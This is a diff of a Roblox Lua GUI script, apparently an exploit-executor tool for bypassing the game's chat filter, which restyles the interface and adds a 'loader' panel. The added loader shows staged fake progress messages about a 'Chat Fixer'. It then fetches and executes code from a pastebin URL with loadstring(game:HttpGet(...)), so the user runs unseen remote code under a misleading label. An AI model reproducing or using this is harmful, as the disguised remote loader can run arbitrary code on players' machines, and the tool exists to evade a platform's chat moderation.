@@ -1,98 +1,86 @@
 local gui = Instance.new("ScreenGui")
-gui.Name = "Chat Bypasser"
 gui.Parent = game.CoreGui
 
-local main = Instance.new("Frame")
-main.Size = UDim2.new(0.2, 0, 0.05, 0)
-main.Position = UDim2.new(0.2, 0, 0.2, 0)
-main.BackgroundColor3 = Color3.new(0, 0, 0.5)
-main.BorderSizePixel = 0
-main.Active = true
-main.BackgroundTransparency = 0
-main.Draggable = true
-main.Parent = gui
+local bar = Instance.new("Frame")
+bar.Size = UDim2.new(0.2, 0, 0.04, 0)
+bar.Position = UDim2.new(0.2, 0, 0.1, 0)
+bar.BackgroundColor3 = Color3.new(0.3,0.3,0.3)
+bar.BorderColor3 = Color3.new(0, 0, 0)
+bar.BorderSizePixel = 0
+bar.Active = true
+bar.BackgroundTransparency = 0 
+bar.Draggable = true
+bar.Parent = gui
 
 local lbl = Instance.new("TextLabel")
-lbl.Size = UDim2.new(0.62, 0, 1, 0)
+lbl.Size = UDim2.new(0.8, 0, 1, 0)
 lbl.Position = UDim2.new(0, 0, 0, 0)
 lbl.BackgroundColor3 = Color3.new(0, 0, 0)
+lbl.BorderColor3 = Color3.new(0, 0, 0)
 lbl.BorderSizePixel = 0
-lbl.Text = "NPatch Bypass 2.2.1"
+lbl.Text = "NeverPatched 2.2.2"
 lbl.TextColor3 = Color3.new(255, 255, 255)
 lbl.BackgroundTransparency = 1
-lbl.Font = Enum.Font.ArialBold
+lbl.Font = Enum.Font.Arial
 lbl.TextSize = 15
-lbl.Parent = main
+lbl.TextXAlignment = Enum.TextXAlignment.Left
+lbl.Parent = bar
 
-local mi = Instance.new("TextButton")
-mi.Size = UDim2.new(0.1, 0, 0.8, 0)
-mi.Position = UDim2.new(0.89, 0, 0.1, 0)
-mi.BackgroundColor3 = Color3.new(0, 0.3, 0.6)
-mi.BorderSizePixel = 0
-mi.Text = ">"
-mi.TextColor3 = Color3.new(255, 255, 255)
-mi.BackgroundTransparency = 0
-mi.Font = Enum.Font.Arial
-mi.TextSize = 15
-mi.Visible = false
-mi.Parent = main
+local ma = Instance.new("TextButton")
+ma.Size = UDim2.new(0.1, 0, 0.8, 0)
+ma.Position = UDim2.new(0.89, 0, 0.1, 0)
+ma.BackgroundColor3 = Color3.new(0.4, 0.4, 0.4)
+ma.BorderColor3 = Color3.new(0, 0, 0)
+ma.BorderSizePixel = 0
+ma.Text = ">"
+ma.TextColor3 = Color3.new(255, 255, 255)
+ma.BackgroundTransparency = 0
+ma.Font = Enum.Font.Arial
+ma.TextSize = 15
+ma.Parent = bar
 
-local mr = Instance.new("TextButton")
-mr.Size = UDim2.new(0.1, 0, 0.8, 0)
-mr.Position = UDim2.new(0.89, 0, 0.1, 0)
-mr.BackgroundColor3 = Color3.new(0, 0.3,0.6)
-mr.BorderSizePixel = 0
-mr.Text = "–"
-mr.TextColor3 = Color3.new(255, 255, 255)
-mr.BackgroundTransparency = 0
-mr.Font = Enum.Font.Arial
-mr.TextSize = 15
-mr.Parent = main
+local mb = Instance.new("TextButton")
+mb.Size = UDim2.new(0.1, 0, 0.8, 0)
+mb.Position = UDim2.new(0.89, 0, 0.1, 0)
+mb.BackgroundColor3 = Color3.new(0.4, 0.4, 0.4)
+mb.BorderSizePixel = 0
+mb.Text = "–"
+mb.TextColor3 = Color3.new(255, 255, 255)
+mb.BackgroundTransparency = 0
+mb.Font = Enum.Font.Arial
+mb.TextSize = 15
+mb.Parent = bar
 
-local by = Instance.new("Frame")
-by.Size = UDim2.new(1, 0, 5, 0)
-by.Position = UDim2.new(0, 0, 1, 0)
-by.BackgroundColor3 = Color3.new(0, 0, 0.2)
-by.BorderColor3 = Color3.new(0, 0, 0)
-by.BorderSizePixel = 0
-by.Active = false
-by.BackgroundTransparency = 0
-by.Parent = main
+local main = Instance.new("Frame")
+main.Size = UDim2.new(1, 0, 10, 0)
+main.Position = UDim2.new(0, 0, 1, 0)
+main.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
+main.BorderColor3 = Color3.new(0, 0, 0)
+main.BorderSizePixel = 0
+main.Active = 1
+main.BackgroundTransparency = 0
+main.Parent = bar
 
-local cre = Instance.new("TextLabel")
-cre.Size = UDim2.new(0.9, 0, 0.1, 0)
-cre.Position = UDim2.new(0, 0, 0, 0)
-cre.BackgroundColor3 = Color3.new(0, 0, 0)
-cre.BorderColor3 = Color3.new(0, 0, 0)
-cre.BorderSizePixel = 0
-cre.Text = "Created by: Algari_4 / Alga_ri and PlayStationIN"
-cre.TextColor3 = Color3.new(255, 255, 255)
-cre.BackgroundTransparency = 1
-cre.Font = Enum.Font.Arial
-cre.TextSize = 10
-cre.Parent = by
+ma.MouseButton1Click:connect(function()
+    ma.Visible = false
+    mb.Visible = true
+    main.Visible = true
+end)
 
-local yt = Instance.new("TextLabel")
-yt.Size = UDim2.new(0.38, 0, 0.1, 0)
-yt.Position = UDim2.new(0, 0, 0.1, 0)
-yt.BackgroundColor3 = Color3.new(0, 0, 0)
-yt.BorderColor3 = Color3.new(0, 0, 0)
-yt.BorderSizePixel = 0
-yt.Text = "Youtube: @PUSSY"
-yt.TextColor3 = Color3.new(255, 255, 255)
-yt.BackgroundTransparency = 1
-yt.Font = Enum.Font.Arial
-yt.TextSize = 10
-yt.Parent = by
+mb.MouseButton1Click:connect(function()
+    ma.Visible = true
+    mb.Visible = false
+    main.Visible = false
+end)
 
 local box = Instance.new("TextBox")
-box.Size = UDim2.new(0.9, 0, 0.3, 0)
-box.Position = UDim2.new(0.05, 0, 0.25, 0)
-box.BackgroundColor3 = Color3.new(0, 0, 1)
+box.Size = UDim2.new(0.9, 0, 0.2, 0)
+box.Position = UDim2.new(0.05, 0, 0.07, 0)
+box.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
 box.BorderSizePixel = 0
-box.Text = "pls execute this: loadstring(game:HttpGet('https://pastebin.com/raw/qfmByDZ3'))()"
+box.Text = ""
 box.TextColor3 = Color3.new(1,1,1)
-box.BackgroundTransparency = 0.8
+box.BackgroundTransparency = 0
 box.Font = Enum.Font.SourceSans
 box.TextSize = 15
 box.PlaceholderText = "Enter Text..."
@@ -101,32 +89,82 @@ box.ClearTextOnFocus = false
 box.MultiLine = true
 box.TextYAlignment = Enum.TextYAlignment.Top
 box.TextXAlignment = Enum.TextXAlignment.Left
-box.Parent = by
+box.Parent = main
+
+local secm = Instance.new("Frame")
+secm.Size = UDim2.new(0.9, 0, 0.67, 0)
+secm.Position = UDim2.new(0.05, 0, 0.3, 0)
+secm.BackgroundColor3 = Color3.new(1, 1, 1)
+secm.BorderColor3 = Color3.new(0, 0, 0)
+secm.BorderSizePixel = 0
+secm.Active = false
+secm.BackgroundTransparency = 1
+secm.Parent = main
+
+local list = Instance.new("UIListLayout")
+list.HorizontalAlignment = Enum.HorizontalAlignment.Center
+list.SortOrder = Enum.SortOrder.LayoutOrder
+list.Padding = UDim.new(0, 5)
+list.Parent = secm
 
 local send = Instance.new("TextButton")
-send.Size = UDim2.new(0.9, 0, 0.2, 0)
-send.Position = UDim2.new(0.05, 0, 0.6, 0)
-send.BackgroundColor3 = Color3.new(0, 0.3, 0.6)
+send.Size = UDim2.new(1, 0, 0.15, 0)
+send.Position = UDim2.new(0, 0, 0, 0)
+send.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
+send.BorderColor3 = Color3.new(0, 0, 0)
 send.BorderSizePixel = 0
-send.Text = "Send Text"
+send.Text = "Send"
 send.TextColor3 = Color3.new(255, 255, 255)
 send.BackgroundTransparency = 0
 send.Font = Enum.Font.Arial
 send.TextSize = 15
-send.Parent = by
+send.Parent = secm
 
-mi.MouseButton1Click:connect(function()
-    mi.Visible = false
-    mr.Visible = true
-    by.Visible = true
-    end)
+local convert = Instance.new("TextButton")
+convert.Size = UDim2.new(1, 0, 0.15, 0)
+convert.Position = UDim2.new(0.5, 0, 0.5, 0)
+convert.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
+convert.BorderColor3 = Color3.new(0, 0, 0)
+convert.BorderSizePixel = 0
+convert.Text = "Convert"
+convert.TextColor3 = Color3.new(255, 255, 255)
+convert.BackgroundTransparency = 0
+convert.Font = Enum.Font.Arial
+convert.TextSize = 15
+convert.Parent = secm
 
-mr.MouseButton1Click:connect(function()
-    mi.Visible = true
-    mr.Visible = false
-    by.Visible = false
-    end)
+local clear = Instance.new("TextButton")
+clear.Size = UDim2.new(1, 0, 0.15, 0)
+clear.Position = UDim2.new(0.5, 0, 0.5, 0)
+clear.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
+clear.BorderColor3 = Color3.new(0, 0, 0)
+clear.BorderSizePixel = 0
+clear.Text = "Clear"
+clear.TextColor3 = Color3.new(255, 255, 255)
+clear.BackgroundTransparency = 0
+clear.Font = Enum.Font.Arial
+clear.TextSize = 15
+clear.Parent = secm
 
+local credit = Instance.new("TextBox")
+credit.Size = UDim2.new(1, 0, 0.4, 0)
+credit.Position = UDim2.new(0, 0, 0.5, 0)
+credit.BackgroundColor3 = Color3.new(0, 0, 0)
+credit.BorderColor3 = Color3.new(0, 0, 0)
+credit.BorderSizePixel = 1
+credit.Text = "Created By: Algari_4,Alga_ri Only from https://pastebin.com/raw/keSD0xcp"
+credit.TextColor3 = Color3.new(255, 255, 255)
+credit.BackgroundTransparency = 1
+credit.Font = Enum.Font.Arial
+credit.TextSize = 12
+credit.TextWrapped = true
+credit.Active = true
+credit.Parent = secm
+
+-- all function
+clear.MouseButton1Click:connect(function()
+box.Text = ""
+end)
 
 local function convertText()
 local text = box.Text
@@ -173,19 +211,104 @@ send.MouseButton1Click:connect(function()
     box.Text = ""
     end)
 
-local conv = Instance.new("TextButton")
-conv.Size = UDim2.new(0.9, 0, 0.1, 0)
-conv.Position = UDim2.new(0.05, 0, 0.85, 0)
-conv.BackgroundColor3 = Color3.new(0, 0.3, 0.6)
-conv.BorderColor3 = Color3.new(0, 0, 0)
-conv.BorderSizePixel = 0
-conv.Text = "Convert"
-conv.TextColor3 = Color3.new(255, 255, 255)
-conv.BackgroundTransparency = 0
-conv.Font = Enum.Font.Arial
-conv.TextSize = 15
-conv.Parent = by
-
-conv.MouseButton1Click:connect(function()
+convert.MouseButton1Click:connect(function()
 convertText()
+end)
+
+-- loader
+
+local by = Instance.new("Frame")
+by.Size = UDim2.new(1, 0, 1, 0)
+by.Position = UDim2.new(0, 0, 0, 0)
+by.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
+by.BorderColor3 = Color3.new(0, 0, 0)
+by.BorderSizePixel = 0
+by.Active = true
+by.BackgroundTransparency = 0
+by.Visible = true
+by.Parent = main
+
+local bet = Instance.new("TextBox")
+bet.Size = UDim2.new(0.9, 0, 0.2, 0)
+bet.Position = UDim2.new(0.05, 0, 0.1, 0)
+bet.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
+bet.BorderColor3 = Color3.new(0, 0, 0)
+bet.BorderSizePixel = 0
+bet.Text = "Press Load"
+bet.TextColor3 = Color3.new(255, 255, 255)
+bet.BackgroundTransparency = 0
+bet.Font = Enum.Font.Arial
+bet.TextSize = 15
+bet.Active = false
+bet.TextWrapped = true
+bet.Parent = by
+
+local loada = Instance.new("TextButton")
+loada.Size = UDim2.new(0.9, 0, 0.15, 0)
+loada.Position = UDim2.new(0.05, 0, 0.32, 0)
+loada.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
+loada.BorderColor3 = Color3.new(0, 0, 0)
+loada.BorderSizePixel = 0
+loada.Text = "Load Chat Fixer"
+loada.TextColor3 = Color3.new(255, 255, 255)
+loada.BackgroundTransparency = 0
+loada.Font = Enum.Font.Arial
+loada.TextSize = 15
+loada.Parent = by
+
+local loadb = Instance.new("TextButton")
+loadb.Size = UDim2.new(0.9, 0, 0.15, 0)
+loadb.Position = UDim2.new(0.05, 0, 0.32, 0)
+loadb.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
+loadb.BorderColor3 = Color3.new(0, 0, 0)
+loadb.BorderSizePixel = 0
+loadb.Text = "Load Script"
+loadb.TextColor3 = Color3.new(255, 255, 255)
+loadb.BackgroundTransparency = 0
+loadb.Font = Enum.Font.Arial
+loadb.TextSize = 15
+loadb.Visible = false
+loadb.Parent = by
+
+local bot = Instance.new("TextBox")
+bot.Size = UDim2.new(0.9, 0, 0.2, 0)
+bot.Position = UDim2.new(0.05, 0, 0.5, 0)
+bot.BackgroundColor3 = Color3.new(0, 0, 0)
+bot.BorderColor3 = Color3.new(0, 0, 0)
+bot.BorderSizePixel = 0
+bot.Text = "Wait For fixer To load"
+bot.TextColor3 = Color3.new(255, 255, 255)
+bot.BackgroundTransparency = 1
+bot.Font = Enum.Font.Arial
+bot.TextSize = 15
+bot.Visible = false
+bot.Parent = by
+
+loada.MouseButton1Click:connect(function()
+bet.Text = "🟥Function Loading🟥"
+wait(1)
+bet.Text = "🟩Function Loaded🟩"
+wait(2)
+bet.Text = "Wait Until Fixer added"
+wait(3)
+bet.Text = "loadstring(game:HttpGet('https://pastebin.com/raw/qfmByDZ3'))()"
+loadb.Visible = true
+loada.Visible = false
+end)
+
+loadb.MouseButton1Click:connect(function()
+loadb:Destroy()
+bot.Visible = true
+wait(0,000001)
+        local script = bet.Text
+        if #script > 0 then
+        loadstring(script)()
+    end
+wait(4)
+bot.Visible = false
+bet.Text = "🟩Fixer Loaded🟩"
+wait(1)
+bet.Text = "Loading Script"
+wait(2)
+by:Destroy()
 end)
